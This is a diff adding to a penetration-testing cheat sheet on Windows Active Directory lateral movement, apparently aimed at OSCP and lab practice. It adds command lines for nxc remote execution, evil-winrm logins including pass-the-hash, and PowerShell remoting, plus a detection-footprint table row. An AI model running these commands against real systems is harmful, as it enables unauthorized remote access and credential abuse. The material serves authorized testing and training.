@@ -86,6 +86,30 @@ PsExec.exe \\10.10.10.5 -u DOMAIN\administrator -p Password123! cmd.exe
 
 **Reference**: [PsExec — Windows Sysinternals, Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) · [impacket/examples/psexec.py — GitHub](https://github.com/fortra/impacket/blob/master/examples/psexec.py) · [Remote Code Execution Using Impacket — Hacking Articles](https://www.hackingarticles.in/remote-code-execution-using-impacket/)
 
+**Faster (nxc):** `nxc smb <target> -u administrator -p Password123! -x "whoami"` (or `-X` for a PowerShell command) runs a command via the same wmiexec/atexec/smbexec/psexec methods without invoking separate scripts; force a specific method with `--exec-method wmiexec|smbexec|atexec`.
+
+---
+
+### 5. WinRM / PowerShell Remoting
+
+**Explanation**
+WinRM (Windows Remote Management, Microsoft's SOAP-based WS-Management implementation) listens on TCP 5985 (HTTP) / 5986 (HTTPS) and is enabled by default on Windows Server. Any account in the local `Administrators` or `Remote Management Users` group can open a remote PowerShell session. It is the single most-used remote-access vector in modern Windows/AD environments — arguably more common in practice than PsExec/WMI — since it requires no service creation or binary drop and gives a full interactive PowerShell runspace.
+
+**Command Example**
+```bash
+# evil-winrm (Linux attacker box)
+evil-winrm -i 10.10.10.5 -u administrator -p 'Password123!'
+evil-winrm -i 10.10.10.5 -u administrator -H 9e730375b7cbcebf74ae46481e07b0c7   # pass-the-hash
+
+# Native PowerShell Remoting (from a Windows host)
+Enter-PSSession -ComputerName 10.10.10.5 -Credential DOMAIN\administrator
+Invoke-Command -ComputerName 10.10.10.5 -Credential DOMAIN\administrator -ScriptBlock { whoami }
+```
+
+**Requirements**: account is a member of local `Administrators` or `Remote Management Users` on the target, WinRM service running and 5985/5986 reachable.
+
+**Reference**: [evil-winrm — Hackplayers (GitHub)](https://github.com/Hackplayers/evil-winrm) · [Enter-PSSession — Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession) · [WinRM lateral movement — ired.team T1021.006](https://www.ired.team/offensive-security/lateral-movement/lateral-movement-with-psexec)
+
 ---
 
 ## Part 2: AD Persistence Concepts (Reference-Level — Defensive Understanding)
@@ -146,8 +170,9 @@ Afterward, authenticate as any domain user using the master password "mimikatz" 
 | wmiexec.py (WMI) | 135 + dynamic RPC / 445 | Transient output file (optional) | Higher |
 | schtasks /create /s | 445 + RPC (ATSVC) | Scheduled task (Event ID 4698/106) | Medium |
 | PsExec-style (SCM) | 445 + RPC (SCM) | Service (Event ID 7045) + binary | Lowest |
+| WinRM / PowerShell Remoting | 5985/5986 | None (no service/binary) | Higher |
 | AdminSDHolder ACL backdoor | N/A (AD object write) | Persistent ACE, re-applied by SDProp | N/A (persistence, not LM) |
 | DCShadow | N/A (replication) | Rogue DC registration (transient) | N/A (persistence, not LM) |
 | Skeleton Key | N/A (in-memory LSASS patch) | None on disk; gone on reboot | N/A (persistence, not LM) |
 
-**Note**: All four lateral-movement techniques require local Administrator equivalent rights on the target and are intended strictly for use in authorized engagements/labs (OSCP exam network, HTB, etc.).
+**Note**: All five lateral-movement techniques require local Administrator equivalent rights (or, for WinRM, membership in `Administrators`/`Remote Management Users`) on the target and are intended strictly for use in authorized engagements/labs (OSCP exam network, HTB, etc.).
